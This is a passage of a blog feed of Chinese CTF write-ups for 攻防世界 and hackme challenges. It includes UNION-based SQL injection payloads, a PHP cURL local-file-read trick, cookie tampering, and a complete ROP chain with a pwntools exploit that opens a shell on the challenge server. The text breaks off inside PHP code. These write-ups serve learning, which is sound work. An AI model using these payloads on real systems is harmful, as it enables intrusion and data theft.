    <content type="html"><![CDATA[<h2 id="src-攻防世界-cat"><a href="#src-攻防世界-cat" class="headerlink" title="[src = 攻防世界] cat"></a>[src = 攻防世界] cat</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>抓住那只猫<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>首先按照题目要求，输入一个任意域名，发现没有反应，输入一个IP地址，显示了PING命令对结果。初步考虑命令执行。<br>输入“127.0.0.1|ls”，提示“Invalid URL”，看来增加了过滤，直接执行命令不可行。</p><p>在URL的传参处?url=这里，我们传递个%79发现传递之后变成了?url=w，看来是可以传递url编码，系统会接受并进行解析，于是我们传递%80会出现报错，url编码使用的是16进制，80也就是128，ASCII码是从0-127，所以这个时候会报错。url编码表可以参考<a href="http://www.w3school.com.cn/tags/html_ref_urlencode.html" target="_blank" rel="noopener">http://www.w3school.com.cn/tags/html_ref_urlencode.html</a></p><p>在报错信息里面发现这个应用的整体架构：我们给php发出请求，php把请求发送给本地部署的django，然后得到结果。而且从报错页面发现了database信息：/opt/api/database.sqlite3</p><p>由于django本地部署，而且php使用的cURL组件，所以这里，我们使用前面讲的php的cURL文件上传，但需要以@开头。</p><p><img src="./cat1.png" alt="cat"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=@/opt/api/database.sqlite3</span><br></pre></td></tr></table></figure><p>然后在报错也没搜索CTF得到flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-攻防世界-cat&quot;&gt;&lt;a href=&quot;#src-攻防世界-cat&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] cat&quot;&gt;&lt;/a&gt;[src = 攻防世界] cat&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h3&gt;&lt;p&gt;抓住那只猫&lt;br&gt;
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
  </entry>
  
  <entry>
    <title>NewsCenter</title>
    <link href="http://yoursite.com/2019/11/16/NewsCenter/"/>
    <id>http://yoursite.com/2019/11/16/NewsCenter/</id>
    <published>2019-11-16T03:21:02.000Z</published>
    <updated>2019-11-16T03:33:03.541Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-NewsCenter"><a href="#src-攻防世界-NewsCenter" class="headerlink" title="[src = 攻防世界] NewsCenter"></a>[src = 攻防世界] NewsCenter</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>如题目环境报错，稍等片刻刷新即可<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>题目显示一个Search news，随便输入几个数字会发现下面的显示结果变化。输入“1’”程序报错，所以基本确认存在SQLi。下面利用Union查询，测试显示对列数。<br>输入payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11111<span class="string">' union select 1,2,3 #</span></span><br></pre></td></tr></table></figure><p>显示如下：</p><p><img src="./newscenter1.PNG" alt="newcenter"></p><p>发现有三列，并输出第二列和第三列。则可以利用这两列获取数据库信息，payload如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111111<span class="string">' union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #</span></span><br></pre></td></tr></table></figure><p>在最下面发现secret_table。然后表内信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11111111<span class="string">' union select 1,column_name,data_type from information_schema.columns where table_name='</span>secret_table<span class="string">'#</span></span><br></pre></td></tr></table></figure><p>发现一个fl4g字段。然后显示该字段得到flag：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111111<span class="string">' union select 1,2,fl4g from secret_table #</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-攻防世界-NewsCenter&quot;&gt;&lt;a href=&quot;#src-攻防世界-NewsCenter&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] NewsCenter&quot;&gt;&lt;/a&gt;[src = 攻防世界] NewsCenter&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h3&gt;&lt;p&gt;如题目环境报错，稍等片刻刷新即可&lt;br&gt;
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="SQLi" scheme="http://yoursite.com/tags/SQLi/"/>
    
  </entry>
  
  <entry>
    <title>view_source</title>
    <link href="http://yoursite.com/2019/11/15/view-source/"/>
    <id>http://yoursite.com/2019/11/15/view-source/</id>
    <published>2019-11-15T10:42:08.000Z</published>
    <updated>2019-11-16T05:13:18.474Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-view-source"><a href="#src-攻防世界-view-source" class="headerlink" title="[src = 攻防世界] view source"></a>[src = 攻防世界] view source</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>打开题目，右键查看源代码失效。原因是js代码禁用了右键。<br>两种方法：</p><ol><li>使用F12查看；</li><li>在设置里面禁用js。</li></ol><p>以Chrome为例，在设置–&gt;隐私设置和安全性–&gt;网站设置–&gt;JavaScript设置为禁用，则就可以使用右键！查看到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-攻防世界-view-source&quot;&gt;&lt;a href=&quot;#src-攻防世界-view-source&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] view source&quot;&gt;&lt;/a&gt;[src = 攻防世界] view source&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h3&gt;&lt;p&gt;X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。&lt;br&gt;
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="cookie" scheme="http://yoursite.com/tags/cookie/"/>
    
  </entry>
  
  <entry>
    <title>dafuq-manager-1</title>
    <link href="http://yoursite.com/2019/11/15/dafuq-manager-1/"/>
    <id>http://yoursite.com/2019/11/15/dafuq-manager-1/</id>
    <published>2019-11-15T09:38:49.000Z</published>
    <updated>2019-11-15T09:58:29.499Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-hackme-dafuq-manager-系列"><a href="#src-hackme-dafuq-manager-系列" class="headerlink" title="[src = hackme] dafuq-manager 系列"></a>[src = hackme] dafuq-manager 系列</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>dafuq-manager 1：Login as guest and find flag 1<br>dafuq-manager 2：Login as admin, code review and get flag 2<br> <a id="more"></a></p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><h3 id="dafuq-manager-1"><a href="#dafuq-manager-1" class="headerlink" title="dafuq-manager 1"></a>dafuq-manager 1</h3><p>首先根据提示以guest用户登录，看到一个文件列表，发现里面有一个see-me-if-you-need-tips.txt文件，打开提示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Do you know cookie? Create a cookie named `<span class="built_in">help</span>` with value `me`!</span><br></pre></td></tr></table></figure><p>要我们修改cookie，按照要求通过Firefox的Tamper data插件截获并修改插件得到弹窗提示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Very good. You know how to create cookie. How about tamper a cookie?</span><br></pre></td></tr></table></figure><p>说明思路正确，我们去查看原来对cookie，发现里面有一个“show_hidden=no”，我们将其改为yes，刷新页面，发现多了两个文件：<br>“.good.job.here.is.your.hidden.flag-1.txt”和“.where-is-flag-2-please-tell-me.txt”。</p><p>其中第一个文件中包含flag。第二个文件内容为“Try to login as admin! and you will get flag2”</p><h3 id="dafuq-manager-2"><a href="#dafuq-manager-2" class="headerlink" title="dafuq-manager 2"></a>dafuq-manager 2</h3><p>文件目录下还有一个文件为“source-code-in-dafuqManager.7z-please-download-it.txt”。意思是下载源码，所以这是典型对代码审计题目。</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>Cookie</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-hackme-dafuq-manager-系列&quot;&gt;&lt;a href=&quot;#src-hackme-dafuq-manager-系列&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] dafuq-manager 系列&quot;&gt;&lt;/a&gt;[src = hackme] dafuq-manager 系列&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;dafuq-manager 1：Login as guest and find flag 1&lt;br&gt;dafuq-manager 2：Login as admin, code review and get flag 2&lt;br&gt;
    
    </summary>
    
    
      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
    
    
      <category term="cookie" scheme="http://yoursite.com/tags/cookie/"/>
    
  </entry>
  
  <entry>
    <title>rop</title>
    <link href="http://yoursite.com/2019/10/15/rop/"/>
    <id>http://yoursite.com/2019/10/15/rop/</id>
    <published>2019-10-15T07:41:14.000Z</published>
    <updated>2019-10-15T08:43:54.576Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-hackme-rop"><a href="#src-hackme-rop" class="headerlink" title="[src = hackme] rop"></a>[src = hackme] rop</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc hackme.inndy.tw 7704</span><br></pre></td></tr></table></figure><p>Tips: Buffer Overflow, ROP</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>用IDA打开下载的rop可执行文件，发现在overflow()函数里面的gets()调用处存在栈溢出。且溢出的变量在ebp-Ch的位置，所以举例返回地址为0xC+0x4的举例，即16个字节，也就是要在返回地址前面覆盖16个字节的任意数据。</p><p><img src="./rop1.PNG" alt="rop"></p><p>用checksec查看安全机制开启情况：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bitsec@bitsec-ubuntu:~/hackme/rop$ checksec rop</span><br><span class="line">[*] <span class="string">'/home/bitsec/hackme/rop/rop'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>开启了NX机制（栈不可执行Windows平台上称其为DEP），意味着栈不可执行，也就意味着不能直接向栈里面写入shellcode，此时就应该使用ROP（Return-Oriented Programmming Exploit）机制了。攻击者从已有的库或可执行文件中提取指令片段，构建恶意代码。其主要思想是在栈缓冲区溢出的基础上，通过利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而改变程序的执行流程，达到预期利用目的。</p><p>然后使用readelf查看该程序使用的是静态库还是动态库。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bitsec@bitsec-ubuntu:~/hackme/rop$ readelf -d rop</span><br><span class="line"></span><br><span class="line">There is no dynamic section <span class="keyword">in</span> this file.</span><br></pre></td></tr></table></figure><p>发现没有使用动态段，这样以来，问题就更简单了，直接使用直接用ROPgadget –binary rop –ropchain 就可以生成好rop利用链了。</p><p>输出如下的ROP链：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">- Step 5 -- Build the ROP chain</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># execve generated by ROPgadget</span></span><br><span class="line"></span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0806ecda) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080ea060) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080b8016) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'/bin'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0805466b) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0806ecda) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080ea064) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080b8016) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'//sh'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0805466b) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0806ecda) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080ea068) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080492d3) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0805466b) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080481c9) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080ea060) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080de769) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080ea068) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0806ecda) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080ea068) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x080492d3) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0807a66f) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, 0x0806c943) <span class="comment"># int 0x80</span></span><br></pre></td></tr></table></figure><p>结合前面的16字节的任意填充，基于python的pwntool，编写下面的exp程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">offset=<span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process('./rop')</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'hackme.inndy.tw'</span>, <span class="number">7704</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">'A'</span>*offset      <span class="comment">#16 bytes A</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#rop链</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'/bin'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'//sh'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080de769</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806c943</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">io.sendline(p)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><p>执行得到shell，cat flag得到flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-hackme-rop&quot;&gt;&lt;a href=&quot;#src-hackme-rop&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] rop&quot;&gt;&lt;/a&gt;[src = hackme] rop&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;nc hackme.inndy.tw 7704&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;Tips: Buffer Overflow, ROP&lt;/p&gt;
    
    </summary>
    
    
      <category term="PWN" scheme="http://yoursite.com/categories/PWN/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
      <category term="PWN" scheme="http://yoursite.com/tags/PWN/"/>
    
      <category term="ROP" scheme="http://yoursite.com/tags/ROP/"/>
    
      <category term="Overflow" scheme="http://yoursite.com/tags/Overflow/"/>
    
  </entry>
  
  <entry>
    <title>whereisflag</title>
    <link href="http://yoursite.com/2019/10/15/whereisflag/"/>
    <id>http://yoursite.com/2019/10/15/whereisflag/</id>
    <published>2019-10-15T06:46:09.000Z</published>
    <updated>2019-10-15T06:50:41.551Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-hackme-where-is-flag"><a href="#src-hackme-where-is-flag" class="headerlink" title="[src = hackme] where is flag"></a>[src = hackme] where is flag</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>Do you know regular expression?<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>打开题目，下载一个压缩包，解压得到一个flag文件，打开发现大量字符，其中包含大量FLAG。根据题目提示，应该是要进行正则表达式匹配。</p><p><img src="./whereisflag.PNG" alt="flag"></p><h3 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h3><p>本题考察正则表达式的使用。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-hackme-where-is-flag&quot;&gt;&lt;a href=&quot;#src-hackme-where-is-flag&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] where is flag&quot;&gt;&lt;/a&gt;[src = hackme] where is flag&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h3&gt;&lt;p&gt;Do you know regular expression?&lt;br&gt;
    
    </summary>
    
    
      <category term="MISC" scheme="http://yoursite.com/categories/MISC/"/>
    
    
      <category term="MISC" scheme="http://yoursite.com/tags/MISC/"/>
    
      <category term="regular expression" scheme="http://yoursite.com/tags/regular-expression/"/>
    
  </entry>
  
  <entry>
    <title>loginasadmin</title>
    <link href="http://yoursite.com/2019/10/12/loginasadmin/"/>
    <id>http://yoursite.com/2019/10/12/loginasadmin/</id>
    <published>2019-10-12T00:43:12.000Z</published>
    <updated>2019-11-17T02:20:31.782Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-hackme-loginasadmin-系列"><a href="#src-hackme-loginasadmin-系列" class="headerlink" title="[src = hackme] loginasadmin 系列"></a>[src = hackme] loginasadmin 系列</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>login as admin 0： SQL Injection!<br>login as admin 0.1：  Grab the hidden flag<br>Login as Admin 1：Please login as admin.<br>    Tips: SQL Injection but sqlmap not working anymore.<br>    Update: Source code is available now.<br>    Scanner WON’T WORK<br> <a id="more"></a><br>login as admin 1.2：<br>Get another flag<br>Tips: boolean-based SQL injection, information_schema</p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>SQL注入。题目还提供了源码，所以查看，发现进行了一些过滤。</p><h3 id="Login-as-Admin-0"><a href="#Login-as-Admin-0" class="headerlink" title="Login as Admin 0"></a>Login as Admin 0</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $strl = strtolower($str);  <span class="comment">//转换为小写，然后随后的if语句过滤了部分注入常用的关键词，如'or 1=1'</span></span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">'or 1=1'</span>) || strstr($strl, <span class="string">'drop'</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'update'</span>) || strstr($strl, <span class="string">'delete'</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str); <span 